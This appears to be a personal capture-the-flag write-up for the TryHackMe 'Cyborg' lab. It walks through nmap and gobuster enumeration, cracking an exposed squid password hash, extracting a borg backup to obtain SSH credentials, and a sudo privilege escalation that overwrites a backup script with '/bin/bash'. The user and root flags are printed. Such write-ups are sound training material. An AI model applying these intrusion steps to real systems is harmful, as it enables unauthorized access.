- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Root it .
# Scenario

Please deploy the machine so you can get started. Please allow a few minutes to make sure all the services boot up. Good luck!

Twitter: fieldraccoon

# Recon
## Nmap

We add the host in /etc/hosts (cyborg.thm) and scan with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Cyborg]
└─$ nmap -A 10.10.16.31        

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```

# Enumeration
## HTTP (80)

### Gobuster

We start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on port 80 with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Cyborg]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cyborg.thm


.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/admin                (Status: 301) [Size: 308] [--> http://cyborg.thm/admin/]
/etc                  (Status: 301) [Size: 306] [--> http://cyborg.thm/etc/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 275]

```

Admin panel :

<img src="../../2%20-%20Resources/Others/Flameshots/f2a4912e13d1ef42521e787e872e594a.png" alt="f2a4912e13d1ef42521e787e872e594a.png" width="605" height="430" class="jop-noMdConv">

So we have a username : Alex , and other profiles .

If we go in the Admin page :

<img src="../../2%20-%20Resources/Others/Flameshots/4e19048fa6dd1845b735c2d7e6c63eb2.png" alt="4e19048fa6dd1845b735c2d7e6c63eb2.png" width="687" height="300" class="jop-noMdConv">

Here we have Adam,Josh and **Alex** .

If we go in /etc :

<img src="../../2%20-%20Resources/Others/Flameshots/1d9d8b94dbd097e08bfd9c23fefb744e.png" alt="1d9d8b94dbd097e08bfd9c23fefb744e.png" width="323" height="128" class="jop-noMdConv">     <img src="../../Flameshots/6b0567a5641fbea623baa96e25d7dc25.png" alt="6b0567a5641fbea623baa96e25d7dc25.png" width="375" height="128" class="jop-noMdConv">

So we look at passwd file ;

music_archive: **'****$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn** .'

And squid.conf :

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

## Decryption

Let's crack the [Hash](../../3%20-%20Tags/Hacking%20Concepts/Hash.md) but first we identify it somehow:

<img src="../../2%20-%20Resources/Others/Flameshots/2b034948597c949b75a7f169fda184f6.png" alt="2b034948597c949b75a7f169fda184f6.png" width="714" height="71" class="jop-noMdConv">

Now we can decrypt it :

`music_archive:squidward`

We can also Download the archive :

<img src="../../2%20-%20Resources/Others/Flameshots/89d44d666afded63a90673df18909897.png" alt="89d44d666afded63a90673df18909897.png" width="201" height="121" class="jop-noMdConv">

And we have a repository, if we make a further look :

![4a5d223299c170cc3706ad88c4cf0292.png](../../2%20-%20Resources/Others/Flameshots/4a5d223299c170cc3706ad88c4cf0292.png)

<img src="../../2%20-%20Resources/Others/Flameshots/46e69d1d674342a348c48a3d692f116e.png" alt="46e69d1d674342a348c48a3d692f116e.png" width="537" height="354" class="jop-noMdConv">

And yes we have encrypted files so we have to decrypt them .

You can see that in the Usage section there is a section on extracting with the following command `borg extract /path/to/repo::my-files`

We can get our path to repo by doing `pwd`

as for the my-files part this seems to be the music_archive that was mentioned earlier and as the username for the hash.

So we can extract our archive now (note the /path/to/archive might be different for everyone) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Cyborg]
└─$ sudo apt install borgbackup   

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Cyborg]
└─$ borg extract home/field/dev/final_archive::music_archive      
Enter passphrase for key /home/mdn0x/THM/CHALLENGES/Easy/Cyborg/home/field/dev/final_archive: squidward

```

Now we let's look in the directory and we have Alex home, we view note.txt :

<img src="../../2%20-%20Resources/Others/Flameshots/9442fd73d5a7da2b816141473e5175fe.png" alt="9442fd73d5a7da2b816141473e5175fe.png" width="453" height="97" class="jop-noMdConv">

boom !

# First Access
## SSH

We can try the credentials in [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Cyborg]
└─$ ssh alex@10.10.51.181      
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
alex@10.10.51.181's password:  

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

```

And we have the user flag .

# Privilege Escalation

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) checking for sudo -l :

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

```

We can sudo with the [Script](../../3%20-%20Tags/Hacking%20Concepts/Script.md), we go in the directory and see permissions to see if we can write :

```
alex@ubuntu:/etc/mp3backups$ ls -l
total 12
-rw-r--r-- 1 root root  339 Jul 13 12:21 backed_up_files.txt
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 backup.sh
-rw-r--r-- 1 root root   45 Jul 13 12:21 ubuntu-scheduled.tgz

```

And we don't so we try to add writing permissions :

```
alex@ubuntu:/etc/mp3backups$ ls -l
total 12
-rw-r--r-- 1 root root  339 Jul 13 12:23 backed_up_files.txt
-rwxrwxr-- 1 alex alex 1083 Dec 30  2020 backup.sh
-rw-r--r-- 1 root root   45 Jul 13 12:23 ubuntu-scheduled.tgz

```

Worked ! Now we can write it up and execute :

```
alex@ubuntu:/etc/mp3backups$ echo "/bin/bash" > /etc/mp3backups/backup.sh 
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh 

root@ubuntu:/etc/mp3backups# cd ..
root@ubuntu:/etc# cd ..
root@ubuntu:/# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
root@ubuntu:/# cd root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}

```

Pwned !

